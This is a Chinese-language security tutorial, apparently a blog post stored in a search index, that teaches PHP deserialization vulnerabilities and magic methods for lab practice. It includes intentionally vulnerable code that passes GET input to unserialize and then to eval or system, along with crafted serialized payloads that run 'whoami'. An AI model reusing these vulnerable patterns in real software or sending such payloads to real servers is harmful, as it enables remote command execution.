<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浅谈PHP反序列化</title>
    <link href="/2023/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a><strong>PHP反序列化</strong></h1><h2 id="1-靶场环境搭建"><a href="#1-靶场环境搭建" class="headerlink" title="1. 靶场环境搭建"></a>1. 靶场环境搭建</h2><p><a href="https://github.com/mcc0624/php_ser_Class">https://github.com/mcc0624/php_ser_Class</a></p><h2 id="2-类与对象"><a href="#2-类与对象" class="headerlink" title="2. 类与对象"></a>2. 类与对象</h2><p>类的结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Class_Name</span></span>&#123;<br>  <span class="hljs-comment">//成员变量声明</span><br>  <span class="hljs-comment">//成员函数声明</span><br>&#125;<br></code></pre></td></tr></table></figure><p>类的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hero</span></span>&#123;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jineng</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$var1</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实例化和赋值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hero</span></span>&#123;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jineng</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$var1</span>;<br>  &#125;<br>&#125;<br><span class="hljs-variable">$aa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();<br><span class="hljs-variable">$aa</span>-&gt;name = <span class="hljs-string">&quot;程咬金&quot;</span>;<br><span class="hljs-variable">$aa</span> -&gt;sex = <span class="hljs-string">&quot;男&quot;</span>;<br><span class="hljs-variable">$aa</span> -&gt;<span class="hljs-title function_ invoke__">jineng</span>(<span class="hljs-string">&quot;打野&quot;</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$aa</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-序列化基础"><a href="#3-序列化基础" class="headerlink" title="3. 序列化基础"></a>3. 序列化基础</h2><p><strong>序列化的作用：</strong>对象——&gt;字符串（序列化），将对象或数组转化为可储存&#x2F;传输的字符串。<br>序列化就是将对象的状态信息(属性)转换为可以存储或传输的形式的过程。<br>在php中使用函数serialize()来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。<br><img src="/2023/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018184451316.png" alt="image-20231018184451316"><br>a：代表Array数组<br>3：代表有三个变量<br>键值对第一个对应的i表示下标，从0开始；<br>第二个i： 代表int类型，0就表示该类型变量名占0个字符<br>s：代表string类型，2就表示该类型变量名占2个字符<br> 其他：<br>true——&gt;b:1;<br>false——&gt;b:0;</p><p><strong>对象的序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$pub</span>=<span class="hljs-string">&#x27;benben&#x27;</span>;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jineng</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;pub;<br>  &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;testpub&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;benben&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>私有属性在变量名前会加上%00类名%00，因此testpub才显示为9个字节,<br>受保护的话需要在变量名前加上%00*%00。</p><h2 id="4-反序列化的特性"><a href="#4-反序列化的特性" class="headerlink" title="4. 反序列化的特性"></a>4. 反序列化的特性</h2><p><strong>unserialize：</strong></p><ul><li>反序列化之后的内容为一个对象；</li><li>反序列化生成的对象里的值由反序列化里的值提供；与原有类预定义的值无关；</li><li>反序列化不触发类的成员方法，需要调用方法后才能触发(魔术方法);</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;benben&#x27;</span>;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$b</span> = <span class="hljs-number">666</span>;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-variable">$c</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayVar</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-variable">$d</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:4:&quot;Azzm&quot;;s:4:&quot;%00*%00b&quot;;i:666;s:7:&quot;%00test%00c&quot;;b:1;&#125;&#x27;</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">displayVar</span>();<br><span class="hljs-meta">?&gt;</span><br><br><br>F:\phpstudy_pro\WWW\php\unserialize.php:<span class="hljs-number">14</span>:<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#1 (3) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;Azzm&quot;</span><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$b</span> =&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">666</span>)<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$c</span> =&gt;<br>  <span class="hljs-keyword">bool</span>(<span class="hljs-literal">true</span>)<br>&#125;<br>Azzm<br></code></pre></td></tr></table></figure><h2 id="5-反序列化漏洞利用"><a href="#5-反序列化漏洞利用" class="headerlink" title="5. 反序列化漏洞利用"></a>5. 反序列化漏洞利用</h2><h3 id="5-1-漏洞成因"><a href="#5-1-漏洞成因" class="headerlink" title="5.1 漏洞成因"></a>5.1 漏洞成因</h3><p>反序列化过程中，ubserialize()接受的值(字符串)可控；<br>通过更改这个值(字符串)，得到所需要的代码，即生成的对象的属性值。</p><h3 id="5-2-例题"><a href="#5-2-例题" class="headerlink" title="5.2 例题"></a>5.2 例题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayVar</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;index&quot;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$get</span>);<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">displayVar</span>() ;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>error_reporting(0): 这行代码用于关闭PHP错误报告，使得任何可能的错误或警告不会在页面上显示。</li><li>class test{ … }: 这是一个PHP类定义，其中有一个公共属性 <code>$a</code> 被赋值。类中还有一个名为 displayVar 的方法，该方法使用 eval 函数执行&#96; $a 属性中包含的命令。在这里，eval 函数被用来执行动态生成的代码，即执行 $a 中的内容。</li><li>接下来代码尝试从 $_GET[“index”] 获取一个值，然后使用 unserialize 函数将这个值进行反序列化，将其转换为对象。由于没有对 $_GET[“benben”] 的输入进行验证和过滤，攻击者可以构造恶意的序列化数据并将其传递给 benben 参数。这样，攻击者可以在 $a 属性中插入任意代码，并通过 eval 函数执行。</li></ul><h3 id="5-3-构造利用"><a href="#5-3-构造利用" class="headerlink" title="5.3 构造利用"></a>5.3 构造利用</h3><p>O:4:”test”:1:{s:1:”a”;s:17:”system(“whoami”);”;}<br>这是一个序列化的字符串，它被构造成一个类实例。<br>这里的 O 表示对象，4 表示类名 test 的长度，后面的 “test” 是类名本身，1 表示类实例的属性数量，s:1:”a”; 表示属性名，s:17:”system(“whoami”);表示属性值。<br>这个字符串在通过 unserialize 函数反序列化时，将会创建一个 test 类的实例。<br>$b &#x3D; unserialize($get): 这行代码使用 unserialize 函数将序列化字符串转换为对象。在这里，<code>$b </code>将成为一个 test 类的实例。<br><code>$b</code>-&gt;displayVar();: 这行代码调用了 test 类的 displayVar 方法，该方法使用 eval 函数执行了 $a 属性中包含的命令，也就是 system(“whoami”);，试图在服务器上执行whoami命令。</p><p>这段代码的问题在于它通过反序列化攻击来执行恶意系统命令，这可能导致服务器被远程攻击者完全控制。在实际应用中，绝对不应该接受或处理未信任的序列化数据，因为它可能包含恶意代码。为了防范此类攻击，应该使用其他安全的数据传递方式，如JSON，并避免使用 eval 函数执行任何动态生成的代码。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12839954/1697538677850-0b4b714e-7738-4d5b-aa71-21b7b83d6dc5.png#averageHue=%23fefefd&clientId=uece04678-a93c-4&from=paste&height=372&id=nMlOl&originHeight=567&originWidth=1441&originalType=binary&ratio=1.5234375&rotation=0&showTitle=false&size=62909&status=done&style=none&taskId=u5dec71d3-39e8-47b2-8b1f-32823915faf&title=&width=945.8871794871795" alt="image.png"><br>构造：?index&#x3D;O:4:”test”:1:{s:1:”a”;s:17:”system(“whoami”);”;}</p><h2 id="6-魔术方法"><a href="#6-魔术方法" class="headerlink" title="6. 魔术方法"></a>6. 魔术方法</h2><p>魔术方法就是一个与定义好的，在特定情况下自动触发的行为方法，最终触发代码。常见的魔术方法：<br>__sleep() 执行serialize()函数的时候，会被调用</p><p>__wakeup() 苏醒函数，执行unserialize()函数的时候，会被调用<br>__construct() 构造函数，创建一个对象时会被调用，具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作</p><p>__destruct() 析构函数，销毁一个对象时会被调用 ，在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。<br>__get() 调出不可访问（private，protect等修饰）属性时会被调用。</p><p>__set() 修改或写入不可访问（private，protect等修饰）属性时会被调用。<br>__toString() 类对象被当作一个字符串使用时会被调用。</p><p>__isset() 对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。<br>__unset() 对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</p><p>__invoke() 将实例化对象当作方法使用时会被调用。</p><h3 id="6-1-魔术方法的作用"><a href="#6-1-魔术方法的作用" class="headerlink" title="6.1 魔术方法的作用"></a>6.1 魔术方法的作用</h3><p>反序列化漏洞的成因：在反序列化过程中，unserialize()接收的值可控，通过更改这个值，从而插入任意代码，执行一些系统命令。</p><h3 id="6-2-相关机制"><a href="#6-2-相关机制" class="headerlink" title="6.2 相关机制"></a>6.2 相关机制</h3><ul><li>触发时机：动作不同，出发的魔术方法也不同。</li><li>功能</li><li>参数：一些特殊魔术方法会传参。</li><li>返回值</li></ul><h3 id="6-3-construct"><a href="#6-3-construct" class="headerlink" title="6.3 __construct()"></a>6.3 __construct()</h3><p>构造函数，在实例化一个对象的时候，首先会区自动执行的一个方法；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了构造函数一次&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;azzm&quot;</span>);<span class="hljs-comment">#触发construct()函数</span><br><span class="hljs-variable">$k</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$k</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="6-4-destruct"><a href="#6-4-destruct" class="headerlink" title="6.4 __destruct()"></a>6.4 __destruct()</h3><p>析构函数，销毁一个对象时会被调用（<strong>反序列化之后</strong>） ，在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了析构函数1次&quot;</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Azzm&quot;</span>);   <span class="hljs-comment">//可以触发，这段代码为实例化一个对象，实例化过程不会触发，但对象使用完毕后会销毁，此时触发</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);    <span class="hljs-comment">//序列化不可触发</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);          <span class="hljs-comment">//反序列化对象，可以触发</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="6-5-sleep"><a href="#6-5-sleep" class="headerlink" title="6.5 __sleep()"></a>6.5 __sleep()</h3><p>序列化函数<strong>serialize()<strong>函数会检查类中是否存在一个魔术方法</strong>__sleep()，</strong>如果存在，该方法会先被调用，然后才执行序列化操作，<strong>序列化之前触发。</strong><br>此功能可以用于清理对象，并返回一个包含都对象中所有应被序列化的变量名称的数组。<br>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。</p><ul><li>触发时机：序列化之前</li><li>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要属性、</li><li>参数：成员属性</li><li>返回值：需要被序列化存储的成员属性</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>); <span class="hljs-comment">#触发construct()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>); <span class="hljs-comment">#序列化之前触发sleep，只返回username和nikename的值，也就是a和b.</span><br><span class="hljs-meta">?&gt;</span><br>因此序列化结果中不存在password值。<br>输出：O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="6-6-wakeup"><a href="#6-6-wakeup" class="headerlink" title="6.6 __wakeup()"></a>6.6 __wakeup()</h3><p>unserialize()会检查是否存在一个__wakeup()方法，也就是在<strong>反序列化之前</strong>触发；<br>如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;username);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;benben&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user_ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接徒手构造：存在__wakeup方法，那么在反序列化之前会先调用该方法，system($this-&gt;username)可用来构造执行系统命令。这里无论构造几个属性值都会只返回username，那么我们针对username及其属性值进行序列化即可：<br>?benben&#x3D;O:4:”User”:1:{s:8:”username”;s:6:”whoami”;}</p><h3 id="6-7-toString"><a href="#6-7-toString" class="headerlink" title="6.7 __toString"></a>6.7 __toString</h3><p>表达方式错误导致魔术方法触发，常用于构造POP链</p><ul><li>触发时机：对象被当成字符串调用的时候，例如echo $user;</li></ul><h3 id="6-8-invoke"><a href="#6-8-invoke" class="headerlink" title="6.8 __invoke()"></a>6.8 __invoke()</h3><p>格式表达错误导致魔术方法触发</p><ul><li>触发时机：把对象当成函数调用时</li></ul><h3 id="6-9-错误调用相关魔术方法"><a href="#6-9-错误调用相关魔术方法" class="headerlink" title="6.9 错误调用相关魔术方法"></a>6.9 错误调用相关魔术方法</h3><h4 id="6-9-1-call"><a href="#6-9-1-call" class="headerlink" title="6.9.1__call"></a>6.9.1__call</h4><p>触发时机：调用一个不存在的方法时触发。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt; <span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-comment">#触发__call()</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-variable">$arg1</span>,调用不存在的方法的名称，也就是callxxx<br><span class="hljs-variable">$arg2</span>,调用不存在的方法的参数，也就是a<br></code></pre></td></tr></table></figure><h4 id="6-9-2-callStatic"><a href="#6-9-2-callStatic" class="headerlink" title="6.9.2 __callStatic"></a>6.9.2 __callStatic</h4><p>触发时机：静态调用或调用成员变量时使用的方法不存在<br>返回值：调用的不存在的方法的名称和参数<br>同__call()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span 